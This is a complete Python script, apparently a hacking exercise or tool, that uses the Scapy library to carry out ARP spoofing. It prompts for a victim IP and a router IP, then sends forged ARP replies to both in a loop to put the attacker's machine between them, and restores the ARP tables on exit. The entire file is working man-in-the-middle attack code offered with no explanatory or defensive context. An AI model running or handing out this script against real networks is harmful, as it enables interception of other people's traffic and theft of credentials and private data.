import scapy.all as scapy
import time

def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    arp_req_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / arp_req
    answer = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]
    return answer[0][1].hwsrc

def spoof(target_ip, target_mac, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.sendp(scapy.Ether(dst=target_mac) / packet, verbose=False)

def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.sendp(scapy.Ether(dst=dest_mac) / packet, count=5, verbose=False)

victim_ip = input("Enter the target ip : ")
router_ip = input("Enter the router gateway : ")

victim_mac = get_mac(victim_ip)
router_mac = get_mac(router_ip)
packet_count = 0

try:
    while True:
        spoof(victim_ip, victim_mac, router_ip)
        spoof(router_ip, router_mac, victim_ip)
        packet_count += 2
        print("\r[+] Packets Sent: {}".format(packet_count), end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[!] Detected CTRL+C! Restoring ARP tables...")
    restore(victim_ip, router_ip)
    restore(router_ip, victim_ip)
    print("[+] ARP tables restored. Exiting.")
